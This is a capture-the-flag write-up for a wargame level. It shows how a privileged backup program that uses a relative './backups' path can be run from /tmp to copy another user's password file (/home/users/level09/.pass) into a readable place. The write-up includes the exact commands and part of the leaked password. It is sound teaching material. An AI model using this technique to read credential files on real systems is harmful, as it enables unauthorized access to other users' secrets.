# Relative path bypass

## Protection

RELRO | STACK CANARY | NX | PIE
--- | --- | --- | --- 
**Full RELRO** | **Canary found** | NX disable | No PIE 

.got.plt section none writable !

## context

The program open a file argv[1] and its backup located in "./backups/argv[1]".

Problem is we cant write in ./back in $HOME directory:

```bash
$> ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass

mkdir -p ./backups//home/users/level09/.pass
mkdir: cannot create directory `./backups//home': Permission denied
```

Misconfiguration, is, we can write in /tmp/.backups because the specifie a relative path indeed of a full path.

So if i do: 

```bash
$> cd /tmp/
$> mkdir backups
$> echo test > test
$> ~/level08 test
$> cat backups/test 
test
```

It created a backups file called test in the backup directory.

```bash
$> ~/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass

$> mkdir -p ./backups//home/users/level09/
$> ~/level08 /home/users/level09/.pass
$> cat backups/home/users/level09/.pass 
fjAwpJNs2[...]
```